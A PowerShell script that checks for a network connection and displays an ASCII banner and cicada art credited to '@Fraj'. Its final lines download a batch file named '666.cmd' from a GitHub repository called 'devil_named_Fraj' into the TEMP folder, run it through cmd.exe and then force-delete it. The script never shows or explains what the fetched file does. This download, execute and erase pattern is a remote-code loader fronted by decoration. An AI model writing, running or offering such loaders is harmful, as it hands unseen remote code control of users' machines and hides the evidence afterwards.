$Host.UI.RawUI.BackgroundColor = "Black"
$Host.UI.RawUI.ForegroundColor = "White"
Clear-Host

$isConnected = (Test-Connection -ComputerName "1.1.1.1" -Count 1 -Quiet) -or (Test-Connection -ComputerName "raw.githubusercontent.com" -Count 1 -Quiet)

if (-not $isConnected) {
    $errMsg = "   [!] MUST BE CONNECTED TO THE INTERNET : @Fraj   "
    $winWidth = $Host.UI.RawUI.WindowSize.Width
    $padSize = [Math]::Max(0, [Math]::Floor(($winWidth - $errMsg.Length) / 2))
    $pad = " " * $padSize

    Write-Host "`n`n"
    Write-Host $pad -NoNewline
    Write-Host $errMsg -ForegroundColor White -BackgroundColor DarkRed
    Write-Host "`n"
    return
}

$winWidth = $Host.UI.RawUI.WindowSize.Width

$topBone = "        (o)================================================================(o)        "

$banner = @(
    "   .######.   ######## ########     ###         ##   #######   #######   #######  "
    "  ##''  ''##  ##       ##     ##   ## ##        ##  ##     ## ##     ## ##     ## "
    " ##  ####  ## ##       ##     ##  ##   ##       ##  ##        ##        ##        "
    " ## ##  ## ## ######   ########  ##     ##      ##  ########  ########  ########  "
    " ## ##  ## ## ##       ##   ##   ######### ##   ##  ##     ## ##     ## ##     ## "
    "  ##  ####''  ##       ##    ##  ##     ## ##   ##  ##     ## ##     ## ##     ## "
    "   '######'   ##       ##     ## ##     ##  #####    #######   #######   #######  "
)

$bannerPad = " " * [Math]::Max(0, [Math]::Floor(($winWidth - $banner[0].Length) / 2))

Write-Host ""
Write-Host ($bannerPad + $topBone) -ForegroundColor Gray
Write-Host ""

foreach ($line in $banner) {
    Write-Host $bannerPad -NoNewline
    Write-Host $line -ForegroundColor Yellow -BackgroundColor Black
}

Write-Host ""

$cicada = @(
    "                                    ..========..                                  "
    "   ..====########################===='  ####  '====########################====.. "
    " .###'''   ..====----====..   '''###.. (####) ..###'''   ..====----====..   '''###"
    "###'   ..==''   ..----..   ''==..  '###..  ..###'  ..==''   ..----..   ''==..   '#"
    "###  .=='   ..=='      '==..   '==.  '########'  .=='   ..=='      '==..   '==.  #"
    "'###  '==..''   ..====..   ''..=='   .###====###.   '==..''   ..====..   ''..==' #"
    " '###..  ''====''      ''====''   ..###' #### '###..  ''====''      ''====''  ..##"
    "   ''####====..          ..====####''   ######   ''####====..          ..====####'"
    "       ..==####==========####==..      ##====##      ..==####==========####==..   "
    "     .###'   ..==------==..   '###.    ########    .###'   ..==------==..   '###. "
    "    ###'   .=='          '==.   '###   ##====##   ###'   .=='          '==.   '###"
    "    '###..  '==..      ..=='  ..###'    ######    '###..  '==..      ..=='  ..###'"
    "      ''####====########====####''      ##==##      ''####====########====####''  "
    "                                         ####                                     "
    "                                         '##'                                     "
    "                                          \/                                      "
)

$cicadaPad = " " * [Math]::Max(0, [Math]::Floor(($winWidth - $cicada[0].Length) / 2))

foreach ($line in $cicada) {
    Write-Host ($cicadaPad + $line) -ForegroundColor White -BackgroundColor Black
}
Write-Host ""

$url = "https://raw.githubusercontent.com/lenonschizophrenic-crypto/devil_named_Fraj/main/666.cmd"
$tempFile = "$env:TEMP\666.cmd"

Invoke-RestMethod -Uri $url -OutFile $tempFile
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$tempFile`"" -Wait
Remove-Item -Path $tempFile -Force
